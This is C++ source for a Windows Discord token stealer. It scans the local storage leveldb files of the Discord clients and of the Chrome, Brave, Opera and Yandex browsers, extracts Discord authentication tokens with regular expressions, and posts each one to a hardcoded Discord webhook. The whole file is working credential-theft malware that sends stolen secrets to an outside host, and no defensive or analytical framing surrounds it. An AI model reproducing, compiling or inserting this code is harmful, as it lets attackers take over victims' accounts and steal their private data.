#include <iostream>
#include <fstream>
#include <sys/stat.h>
#include <filesystem>
#include <regex>
#include <windows.h>
#include <winhttp.h>
#pragma comment(lib, "winhttp.lib") // Link against WinHTTP library

using namespace std;
namespace fs = std::filesystem;

const char* WEBHOOK = "https://discord.com/api/webhooks/1371790428705259520/XFcQdJQvhhNYPXhh4qrnNzgoFpXFAt8WNR1yFSCfn5v_TiAXotJ_jw5KRgHxbr74-wOO";

bool hasEnding(string const& fullString, string const& ending) {
    if (fullString.length() >= ending.length()) {
        return (0 == fullString.compare(fullString.length() - ending.length(), ending.length(), ending));
    }
    else {
        return false;
    }
}

bool pathExist(const string& s)
{
    struct stat buffer;
    return (stat(s.c_str(), &buffer) == 0);
}

void sendWebhook(const char* content) {
    // Parse the webhook URL
    string webhook_url = WEBHOOK;
    wstring w_webhook_url(webhook_url.begin(), webhook_url.end());

    // Initialize WinHTTP session
    HINTERNET hSession = WinHttpOpen(L"Webhook Client/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0);
    if (!hSession) {
        fprintf(stderr, "WinHttpOpen failed: %lu\n", GetLastError());
        return;
    }

    // Parse the URL to extract host and path
    URL_COMPONENTS urlComp = { sizeof(URL_COMPONENTS) };
    urlComp.dwHostNameLength = -1;
    urlComp.dwUrlPathLength = -1;
    if (!WinHttpCrackUrl(w_webhook_url.c_str(), 0, 0, &urlComp)) {
        fprintf(stderr, "WinHttpCrackUrl failed: %lu\n", GetLastError());
        WinHttpCloseHandle(hSession);
        return;
    }

    wstring hostName(urlComp.lpszHostName, urlComp.dwHostNameLength);
    wstring urlPath(urlComp.lpszUrlPath, urlComp.dwUrlPathLength);

    // Connect to the server
    HINTERNET hConnect = WinHttpConnect(hSession, hostName.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) {
        fprintf(stderr, "WinHttpConnect failed: %lu\n", GetLastError());
        WinHttpCloseHandle(hSession);
        return;
    }

    // Create HTTP request
    HINTERNET hRequest = WinHttpOpenRequest(hConnect,
        L"POST",
        urlPath.c_str(),
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE);
    if (!hRequest) {
        fprintf(stderr, "WinHttpOpenRequest failed: %lu\n", GetLastError());
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return;
    }

    // Set request headers
    wstring headers = L"Content-Type: application/x-www-form-urlencoded\r\n";
    if (!WinHttpAddRequestHeaders(hRequest, headers.c_str(), (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD)) {
        fprintf(stderr, "WinHttpAddRequestHeaders failed: %lu\n", GetLastError());
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return;
    }

    // Send the request
    string postData = content;
    if (!WinHttpSendRequest(hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS,
        0,
        (LPVOID)postData.c_str(),
        (DWORD)postData.length(),
        (DWORD)postData.length(),
        0)) {
        fprintf(stderr, "WinHttpSendRequest failed: %lu\n", GetLastError());
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return;
    }

    // Receive response
    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        fprintf(stderr, "WinHttpReceiveResponse failed: %lu\n", GetLastError());
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return;
    }

    // Check status code (optional, for debugging)
    DWORD statusCode = 0;
    DWORD statusCodeSize = sizeof(statusCode);
    WinHttpQueryHeaders(hRequest,
        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        NULL,
        &statusCode,
        &statusCodeSize,
        NULL);
    if (statusCode != 200 && statusCode != 204) {
        fprintf(stderr, "Webhook request failed with status code: %lu\n", statusCode);
    }

    // Clean up
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
}

vector<string> grabPath()
{
    vector<string> targetLocations;

    char* roaming;
    size_t len;
    _dupenv_s(&roaming, &len, "APPDATA");

    char* local;
    size_t len2;
    _dupenv_s(&local, &len2, "LOCALAPPDATA");

    string Discord = string(roaming) + "\\Discord";
    string DiscordCanary = string(roaming) + "\\discordcanary";
    string DiscordPTB = string(roaming) + "\\discordptb";
    string Opera = string(roaming) + "\\Opera Software\\Opera Stable";
    string Chrome = string(local) + "\\Google\\Chrome\\User Data\\Default";
    string Brave = string(local) + "\\BraveSoftware\\Brave-Browser\\User Data\\Default";
    string Yandex = string(local) + "\\Yandex\\YandexBrowser\\User Data\\Default";

    targetLocations.push_back(Discord);
    targetLocations.push_back(DiscordCanary);
    targetLocations.push_back(DiscordPTB);
    targetLocations.push_back(Opera);
    targetLocations.push_back(Chrome);
    targetLocations.push_back(Brave);
    targetLocations.push_back(Yandex);

    free(local);
    free(roaming);

    return targetLocations;
}

vector<string> findMatch(string str, regex reg)
{
    vector<string> output;
    sregex_iterator currentMatch(str.begin(), str.end(), reg);
    sregex_iterator lastMatch;

    while (currentMatch != lastMatch) {
        smatch match = *currentMatch;
        output.push_back(match.str());
        currentMatch++;
    }

    return output;
}

void searchToken(const string& loc) {
    ifstream ifs(loc, ios_base::binary);
    string content((istreambuf_iterator<char>(ifs)), (istreambuf_iterator<char>()));

    vector<string> master;

    regex reg1("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}");
    regex reg2("mfa\\.[\\w-]{84}");

    vector<string> check = findMatch(content, reg1);
    vector<string> check2 = findMatch(content, reg2);

    for (int i = 0; i < check.size(); i++) {
        master.push_back(check[i]);
    }
    for (int i = 0; i < check2.size(); i++) {
        master.push_back(check2[i]);
    }

    for (int i = 0; i < master.size(); i++) {
        string combine = "content=";
        combine += "```" + master[i] + "```";
        const char* postContent = combine.c_str();
        sendWebhook(postContent);
    }
}

void getToken(const string& path)
{
    string target = path + "\\Local Storage\\leveldb";

    for (const auto& entry : fs::directory_iterator(target))
    {
        // Convert std::u8string to std::string
        auto u8path = entry.path().u8string();
        string strPath(u8path.begin(), u8path.end());

        if (hasEnding(strPath, ".log"))
        {
            searchToken(strPath);
        }

        if (hasEnding(strPath, ".ldb"))
        {
            searchToken(strPath);
        }
    }
}

int main()
{
    vector<string> targetLocation = grabPath();
    for (int i = 0; i < targetLocation.size(); i++) {
        if (pathExist(targetLocation[i])) {
            getToken(targetLocation[i]);
        }
    }
    return 0;
}